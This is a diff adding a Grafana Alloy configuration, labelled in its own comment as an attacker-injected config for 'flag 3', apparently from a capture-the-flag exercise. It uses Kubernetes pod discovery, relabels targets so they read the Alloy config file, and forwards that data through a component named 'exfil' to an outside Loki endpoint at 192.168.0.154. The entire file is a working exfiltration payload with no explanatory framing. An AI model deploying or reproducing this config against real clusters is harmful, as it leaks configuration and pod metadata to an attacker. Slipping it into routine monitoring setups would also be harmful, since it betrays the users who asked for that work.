@@ -1,0 +1,33 @@
+// Attacker-injected config: flag 3 — k8s pod metadata + exfil via loki.write
+declare "user_pipeline" {
+  discovery.kubernetes "pods" {
+    role = "pod"
+  }
+
+  discovery.relabel "pod_metadata" {
+    targets = discovery.kubernetes.pods.targets
+    rule {
+      action = "labelmap"
+      regex  = "__meta_kubernetes_pod_annotation_(.+)"
+    }
+    rule {
+      source_labels = ["__meta_kubernetes_pod_name"]
+      target_label  = "pod"
+    }
+    rule {
+      replacement  = "/etc/alloy/config.alloy"
+      target_label = "__path__"
+    }
+  }
+
+  loki.source.file "exfil" {
+    targets    = discovery.relabel.pod_metadata.output
+    forward_to = [loki.write.exfil.receiver]
+  }
+
+  loki.write "exfil" {
+    endpoint {
+      url = "http://192.168.0.154:3100/loki/api/v1/push"
+    }
+  }
+}
